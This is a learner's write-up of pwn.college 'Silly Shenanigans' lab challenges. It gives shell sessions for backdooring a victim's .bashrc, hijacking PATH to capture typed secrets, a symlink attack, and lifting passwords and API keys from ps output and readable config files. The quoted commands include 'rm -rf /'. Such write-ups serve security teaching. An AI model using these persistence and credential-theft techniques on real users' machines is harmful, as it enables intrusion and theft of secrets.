# Silly Shenanigans

## Bashrc Backdoor 
When your shell starts up, it looks for .bashrc file in your home directory and executes it as a startup script. You can customize your /home/hacker/.bashrc with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's .bashrc is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a echo "Hackers were here!" at the end of their .bashrc. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as .bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named zardus, with a home directory of /home/zardus. You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag. The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

HINT: Like the scripts you explored in Chaining Commands, the .bashrc script is just a shell script. Adding a new line with a command on it (e.g., echo Hello Hackers) will get that command executed, so all you really need to think about is what command will get you the flag!

NOTE: The victim's /home/zardus/.bashrc will have a lot of stuff already in it: the shell's startup is a complex affair. Don't panic --- just add your payload to the end and hope for the best!

HINT: Need to poke around as zardus to debug your solution? In practice mode, you can use sudo su --login zardus to drop into a Zardus session!

### Solve
**Flag: pwn.college{UTcVX42zAsC-cauR6hvKWuJAo_t.0VMzEzNxwyNwAzNzEzW}**

```bash
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
  GNU nano 8.4                                            /home/zardus/.bashrc                                             Modified
  # this sets up a scary red shell prompt!
  PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

  # add your attack below this line!
  cat /flag
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{UTcVX42zAsC-cauR6hvKWuJAo_t.0VMzEzNxwyNwAzNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```
First I ran the nano /home/zardus/.bashrc to edit the script of the .bashrc which is the victim's startup and added cat /flag to the content to print the flag contents. Then I ran /challenge/victim to simulate the victim and then its startup runs cat /flag to print out he flag contents.

### New Learnings
The significance of .bashrc file and how it acts as the startup commands.

## Sniffing Input
In the previous level, you abused Zardus's ~/.bashrc to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?

HINT: Is Zardus getting spooked by your hijack? He's careful --- he checks for the flag_checker prompt of Type the flag. Make sure your hijack also prints this prompt (e.g., echo "Type the flag"). Other than printing that prompt, your fake flag_checker can either just a) cat Zardus's input to stdout (e.g., cat with no arguments) or b) read it into a variable and echo it out. Up to you!

HINT: Don't forget to make your fake flag_checker executable, like you learned in the Perceiving Permissions module!

### Solve
**Flag: pwn.college{U83Rb158xTj98FGLSMTtYeMiadN.0VNzEzNxwyNwAzNzEzW}**

```bash
hacker@shenanigans~sniffing-input:~$ nano /home/hacker/flag_checker
  GNU nano 8.4                                          /home/hacker/flag_checker
  #!/bin/bash

  echo "Type the flag"
  cat
hacker@shenanigans~sniffing-input:~$ chmod +x /home/hacker/flag_checker
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc
  GNU nano 8.4                                            /home/zardus/.bashrc
  # this sets up a scary red shell prompt!
  PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

  # add your attack below this line!
  export PATH="/home/hacker:$PATH"
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
*************************************************************pwn.college{U83Rb158xTj98FGLSMTtYeMiadN.0VNzEzNxwyNwAzNzEzW}
exit
```
I made a script for my own flag_checker in my own home directory, which echoed type the flag and catted the flag itself inputted by the user, then changed the permissions of the flag checker script file to make it executable. Then, editted the startup script of the victim zardus and exported PATH from my shell to add it to zardus and in that, I set the PATH variable to my home directory with the $PATH variable to have the original path content aswell to builtin run commands and then ran /challenge/victim to successfully print out the flag that the victim typed in.  


### New Learnings
How to sniff out an input from a victim user and how to use the export command to make a shell variable accessible to new programs and scripts. 

### Resources
https://youtu.be/wgVGZUTgix0?si=ZwHF1E39_xQWfgww

## Overshared Directories 
Alright, Zardus has wised up --- why would he have a writable .bashrc, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:
```bash
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```
And then a hacker comes along and does the following, despite not owning the todo-list file!
```bash
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: hacker has no write access to the todo-list but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:
```bash
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?

### Solve
**Flag: pwn.college{kEeoA6p9WaRMpy4oxp-mAEO7hlC.0FM0EzNxwyNwAzNzEzW}**

```bash
hacker@shenanigans~overshared-directories:~$ nano /home/hacker/flag_checker
  GNU nano 8.4                                          /home/hacker/flag_checker
  #!/bin/bash

  echo "Type the flag"
  cat
hacker@shenanigans~overshared-directories:~$ chmod +x /home/hacker/flag_checker
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
rm: remove write-protected regular file '/home/zardus/.bashrc'? y
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
  GNU nano 8.4                                            /home/zardus/.bashrc
  #!/bin/bash

  export PATH="/home/hacker:$PATH"
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
*************************************************************pwn.college{kEeoA6p9WaRMpy4oxp-mAEO7hlC.0FM0EzNxwyNwAzNzEzW}
exit
```
I made a script for my own flag_checker in my own home directory, which echoed type the flag and catted the flag itself inputted by the user, then changed the permissions of the flag checker script file to make it executable. Then, since I couldnt edit the startup .bashrc file of the victim I removed it and rewrote it's script by making the file, and in the script I exported PATH, which was set with my(hacker) home directory and $PATH to have access to builtin commands. Then I ran /challenge/victim to sniff out the flag from the zardus victim input.

### New Learnings
Better Understanding in sniffing out a user's input with variable obstacles/restrictions.

## Tricky Linking 
Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing /tmp/collab. He's made that directory world-readable and has started a list of evil commands to remember!
```bash
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
```
In this challenge, when you run /challenge/victim, Zardus will add cat /flag to that list of commands:
```bash
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```
Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!

You know the file to link to. Pull off the attack, and get /flag (which, for this level, Zardus can read again!).

HINT: You'll need to run /challenge/victim twice: once to get cat /flag written to where you want, and once to trigger it!

Is /tmp dangerous to use??? Despite the attack shown here, /tmp can be used safely. The directory is world-writable, but has a special permission bit set:
```bash
hacker@dojo:~$ ls -ld /tmp
drwxrwxrwt 29 root root 1056768 Jun  6 14:06 /tmp
hacker@dojo:~$
```
That t bit at the end is the sticky bit. The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory. It's designed to prevent this exact attack! The problem in this challenge, of course, was that Zardus did not enable the sticky bit on /tmp/collab. This would have closed the hole in this specific case:
```bash
zardus@dojo:~$ chmod +t /tmp/collab
```
Of course, shared resources like world-writable directories are still dangerous. Much later, in the Race Conditions of the Green Belt material, you'll see many ways in which such resources can cause security issues!

### Solve
**Flag: pwn.college{YqUncaFavD_kJ6HpYR8DLxYbWZX.0VM0EzNxwyNwAzNzEzW}**

```bash
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: **********
pwn.college{YqUncaFavD_kJ6HpYR8DLxYbWZX.0VM0EzNxwyNwAzNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```
First I removed /tmp/collab/evil-commands.txt so that I can overwrite it with my own, then I created a symlink where /home/zardus/.bashrc(which is unwritable) is the target file and /tmp/collab/evil-commands.txt is where the victim thinks its writing to, then I ran /challenge/victim to send a command of cat /flag to /tmp/collab/evil-commands.txt and ran it again for the second time so that it automatically prints the flag on startup.  

### New Learnings
How to create symlinks to a .bashrc startup file.

## Sniffing Process Arguments
Poor Zardus; you've hacked him pretty heavily. But he's wisened up and secured his home directory! Game over?

Not quite! One of the things that people often don't think about when there are multiple accounts on one computer is what kind of data their command invocations leak. Remember, when you do ps aux, you get:
```bash
hacker@dojo:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
hacker         1  0.0  0.0   1128     4 ?        Ss   05:34   0:00 /sbin/docker-init -- /bin/sleep 6h
hacker         7  0.0  0.0   2736   580 ?        S    05:34   0:00 /bin/sleep 6h
hacker       102  0.4  0.0 723944 64660 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       138  3.3  0.0 968792 106272 ?       Sl   05:34   0:07 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       287  0.0  0.0 717648 53136 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       318  3.3  0.0 977472 98256 ?        Sl   05:34   0:06 /usr/lib/code-server/lib/node --dns-result-order=
hacker       554  0.4  0.0 650560 55360 ?        Rl   05:35   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       571  0.0  0.0   4600  4032 pts/0    Ss   05:35   0:00 /usr/bin/bash --init-file /usr/lib/code-server/li
hacker      1172  0.0  0.0   5892  2924 pts/0    R+   05:38   0:00 ps aux
hacker@dojo:~$
```
But what would happen if one of the arguments of one of those commands was something sensitive, like the flag or a password? This happens, and nefarious users sharing the same machine (or somehow otherwise listing processes on it) can steal that data and use it!

That's what this challenge explores. Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use sudo (and, thus, to sudo cat /flag!). Steal the password, log in to Zardus' account (recall the su command from the Untangling Users module), and get that flag!
### Solve
**Flag: pwn.college{MLLsRKxPwnzKcBKuvyBM87PdicB.0FOzEzNxwyNwAzNzEzW}**

```bash
hacker@shenanigans~sniffing-process-arguments:~$ ps aux | grep zardus
root         147  0.0  0.0   5204  3520 ?        S    13:58   0:00 su -c auto.sh --user zardus --pass pw_295555191 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   13:58   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_295555191
zardus       152  0.0  0.0 231708  2560 ?        S    13:58   0:00 sleep 6h
hacker       173  0.0  0.0 230696  2560 pts/0    S+   14:01   0:00 grep --color=auto zardus
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password:
zardus@shenanigans~sniffing-process-arguments:~$ sudo cat /flag
pwn.college{MLLsRKxPwnzKcBKuvyBM87PdicB.0FOzEzNxwyNwAzNzEzW}
```
I ran ps aux with grep zardus argument to list out all the processes running with the keyword zardus, then I looked for something similar to a password in these processes to find pw_295555191 as the password, then I ran su zardus to change user to zardus and then entered the password successfully and ran sudo cat /flag to obtain the flag

### New Learnings
How data secrets can leak through process lists. 

## Snooping on Configurations 
Even without making mistakes, users might inadvertently leave themselves at risk. For example, many files in a typical user's home directory are world-readable by default, despite frequently being used to store sensitive information. Believe it or not, your .bashrc is world-readable unless you explicitly change it!
```bash
hacker@dojo:~$ ls -l ~/.bashrc
-rw-r--r-- 1 hacker hacker 148 Jun  7 05:56 /home/hacker/.bashrc
hacker@dojo:~$
```
You might think, "Hey, at least it's not world-writable by default"! But even world-readable, it can do damage. Since .bashrc is processed by the shell at startup, that is where people typically put initializations for any environment variables they want to customize. Most of the time, this is innocuous things like PATH, but sometimes people store API keys there for easy access. For example, in this challenge:
```bash
zardus@dojo:~$ echo "FLAG_GETTER_API_KEY=sk-XXXYYYZZZ" > ~/.bashrc
```
Afterwards, Zardus can easily refer to the API key. In this level, users can use a valid API key to get the flag:
```bash
zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
```
Naturally, Zardus stores his key in .bashrc. Can you steal the key and get the flag?

NOTE: When you get the API key, just execute flag_getter as the hacker user. This challenge's /challenge/victim is just for theming: you don't need to use it.

### Solve
**Flag: pwn.college{4e7d7ak3gtcna3kBpbm12omadn0.0lM0EzNxwyNwAzNzEzW}**

```bash
hacker@shenanigans~snooping-on-configurations:~$ nano /home/zardus/.bashrc
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-1335011832
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{4e7d7ak3gtcna3kBpbm12omadn0.0lM0EzNxwyNwAzNzEzW}
```
I ran nano /home/zardus/.bashrc to go through zardus' startup script, which was very long so I pressed Ctrl+F and wrote "API" to search for something key related in the file to find "FLAG_GETTER_API_KEY=sk-1335011832" as the API key, so I copied its contents and executed the command flag getter -key with the API key as the argument to find the flag. 

### New Learnings
The risk of world-readable config files.



